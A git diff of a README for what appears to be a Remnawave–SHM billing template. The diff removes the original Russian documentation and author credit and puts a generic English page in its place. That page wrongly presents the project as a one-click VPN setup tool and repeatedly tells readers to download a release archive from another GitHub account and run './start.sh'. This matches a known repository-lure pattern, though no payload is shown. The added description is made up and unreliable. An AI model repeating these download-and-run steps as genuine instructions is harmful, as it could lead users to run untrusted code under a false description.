@@ -1,140 +1,100 @@
-# 🧩 Remnawave SHM Template
+# 🌊 remnawave-shm-template - Simplify Your VPN Setup Today
 
-Шаблон для интеграции **Remnawave Panel** с биллингом **SHM (Server Hosting Manager)**.  
-Позволяет автоматически создавать, блокировать, продлевать и удалять пользователей Remnawave из интерфейса SHM.  
-Полностью совместим с экосистемой **Friends Connect / VPN for Friends**.
+[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/84949/remnawave-shm-template/releases)
 
----
+## 📜 Description
 
-## 🚀 Возможности
+The remnawave-shm-template helps automate your VPN setup. Whether you're connecting with friends or managing your online privacy, this tool brings ease to your Linux experience. With its simple bash scripts, you can streamline your tasks without needing technical skills.
 
-- Автоматическое управление пользователями Remnawave:
-  - создание, активация, блокировка, продление, удаление;
-- Привязка к **Internal Squad** (через имя, без кэша UUID);
-- Корректная обработка срока действия `{{ us.expire }}` с учётом таймзоны SHM и перехода на летнее/зимнее время;
-- Загрузка JSON-профиля пользователя в SHM (`storage/manage/vpn_rmw_<id>`);
-- Минимальные зависимости (`curl`, `jq`);
-- **🆕 Опциональная поддержка sanitize-username (совместимость с Marzban-legacy ссылками)**.
+## 🚀 Getting Started
 
----
+To get started with the remnawave-shm-template, follow these simple steps to download and run the application.
 
-## ⚙️ Настройки сервера `remnawave`
+### 🌐 What You Need
 
-В SHM в разделе **Settings → Servers → [ваш сервер] → Settings JSON**  
-нужно добавить параметры:
+- A Linux operating system.
+- Basic access to your terminal.
+- A stable internet connection.
 
-```yaml
-remnawave:
-  api: https://panel.example.com           # Базовый URL панели Remnawave (https://...)
-  token: eyJh...                           # API-токен (Bearer)
-  default_internal_squad_name: Default-Squad  # Internal Squad, куда добавляются новые пользователи
+### 🛠 System Requirements
 
-  # Необязательные параметры:
-  shm_tz: Europe/Moscow          # Таймзона SHM, если отличается от системной
-  expire_safety_minutes: 0       # Дополнительный буфер в минутах (например, 21)
-  sanitize_username: false       # 🆕 Включает алгоритм приведения username (Marzban-style)
-```
+This application works smoothly on most modern Linux distributions. Ensure that you have the latest updates for compatibility.
 
-### 🔍 Описание параметров
+## 🏃‍♂️ Download & Install
 
-| Параметр | Обязательный | Описание |
-|-----------|--------------|-----------|
-| `api` | ✅ | Базовый URL API панели (например `https://panel.example.com`) |
-| `token` | ✅ | Bearer-токен администратора Remnawave |
-| `default_internal_squad_name` | ✅ | Имя Internal Squad для новых пользователей |
-| `shm_tz` | ⛔ | Таймзона SHM для корректной конвертации времени (пример: `Europe/Moscow`) |
-| `expire_safety_minutes` | ⛔ | Дополнительный сдвиг срока действия в минутах |
-| `sanitize_username` | ⛔ | Если `true`,username приводится алгоритмом из remnawave/subscription-page |
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page and download the latest version:
 
----
+   [Download from GitHub Releases](https://github.com/84949/remnawave-shm-template/releases)
 
-## 🧹 Опция `sanitize_username`
+2. **Choose a Version**  
+   On the Releases page, you will see a list of versions. Click on the latest version to expand the details.
 
-Когда параметр:
+3. **Download the File**  
+   Look for the installation file. It will typically be named something like `remnawave-shm-template-version.tar.gz`. Click the file to start the download.
 
-```yaml
-sanitize_username: true
-```
+4. **Open the Terminal**  
+   Once the download is complete, open your terminal. You can usually find this in your applications menu.
 
-включён — все вызовы API Remnawave (кроме `CREATE`) используют **санитизированное имя пользователя**:
+5. **Navigate to Your Downloads Folder**  
+   Type the following command in your terminal:
 
-- допускаются только `[A-Za-z0-9_-]`;
-- остальные символы заменяются на `_`;
-- минимальная длина username — **6 символов** (недостающие заменяются `_`);
-- алгоритм полностью совпадает с реализацией в:  
-  https://github.com/remnawave/subscription-page/blob/main/backend/src/common/utils/sanitize-username.ts
-
-Это необходимо для корректной работы **legacy-ссылок Marzban**, где username проходил аналогичную нормализацию.
-
-### 👉 Важно:
-- `CREATE` всегда использует оригинальный username (`us_<id>`);
-- Все остальные события (`ACTIVATE`, `BLOCK`, `REMOVE`, `UPDATE`, `PROLONGATE`) используют санитизированную версию.
-
----
-
-## 🕒 Обработка времени
-
-Функция `_expire_iso()` автоматически:
-- читает `{{ us.expire }}` из SHM (локальное время сервера или заданная `shm_tz`);
-- учитывает переходы DST;
-- переводит в формат ISO-8601 UTC (`YYYY-MM-DDTHH:MM:SSZ`);
-- при необходимости добавляет `expire_safety_minutes`.
-
----
-
-## 📜 Установка
-
-1. В панели SHM откройте **Templates → Add new**.
-2. Назовите шаблон, например:  
+   ```bash
+   cd ~/Downloads
    ```
-   vpn_rmw
+
+6. **Extract the Downloaded File**  
+   To extract the contents of the downloaded file, run:
+
+   ```bash
+   tar -xzvf remnawave-shm-template-version.tar.gz
    ```
-3. Скопируйте содержимое файла `shm-remnawave.template.sh`  
-   или версии с санитизацией:  
-   `shm-remnawave.template.sanitized.sh`
-4. Сохраните.
 
----
+7. **Run the Application**  
+   Navigate into the folder that was created:
 
-## 🔧 Требования
+   ```bash
+   cd remnawave-shm-template
+   ```
 
-- `curl`
-- `jq`
-- GNU coreutils (`date` с поддержкой TZ)
+   Then run the application by entering:
 
----
+   ```bash
+   ./start.sh
+   ```
 
-## 🧰 События
+### ✅ Final Steps
 
-| Событие | Действие в Remnawave |
-|----------|----------------------|
-| `CREATE` | Создание пользователя и загрузка JSON-конфига |
-| `ACTIVATE` | Активация пользователя |
-| `BLOCK` | Блокировка пользователя |
-| `PROLONGATE` | Сброс трафика + продление срока |
-| `REMOVE` | Удаление пользователя |
-| `UPDATE` | Обновление JSON-конфига в SHM |
+You may need to authorize certain permissions. Follow the prompts in your terminal. After that, the application will start, guiding you through the setup process.
 
----
+## 📚 Features
 
-## 🔗 Связанные проекты
+- **Automation:** Automatically set up your VPN with ease.
+- **Easy Integration:** Connect with friends and streamline your online activities.
+- **Linux Support:** Tailored specifically for Linux users.
+- **Lightweight:** Minimal resource usage while running.
 
-| Проект | Описание |
-|--------|-----------|
-| [Remnawave Panel](https://github.com/remnawave) | Панель управления VLESS/Xray |
-| [SHM (Server Hosting Manager)](https://github.com/danuk/shm) | Биллинг VPN/хостинга |
-| [Friends Connect](https://t.me/vpn_for_myfriends_bot) | Экосистема VPN for Friends |
+## 🤝 Support and Contributions
 
----
+If you encounter issues or need assistance, please check the Issues tab in this repository. You can also submit your own issues or suggestions to help improve the application.
 
-## 📄 Лицензия
+## 🚧 Known Issues
 
-[MIT License](LICENSE)
+- Ensure you have the right permissions to run the scripts.
+- Some older Linux distributions may require additional libraries.
 
----
+## 🛡 License
 
-## 🤝 Автор
+This project is licensed under the MIT License. You can read it in the `LICENSE` file for more information.
 
-**Sergey Ryabkov**  
-GitHub: [@ryabkov82](https://github.com/ryabkov82)
-Проект: [VPN for Friends](https://t.me/vpn_for_myfriends_bot)
+### 📧 Contact
+
+For any questions or contributions, feel free to reach out through GitHub or via email at support@remnawave.com.
+
+## 🔄 Stay Updated
+
+Stay informed about new releases by watching this repository. You can click the "Watch" button at the top of the page.
+
+Remember, for a smooth download and installation, always refer back to the Downloads page:
+
+[Download from GitHub Releases](https://github.com/84949/remnawave-shm-template/releases)
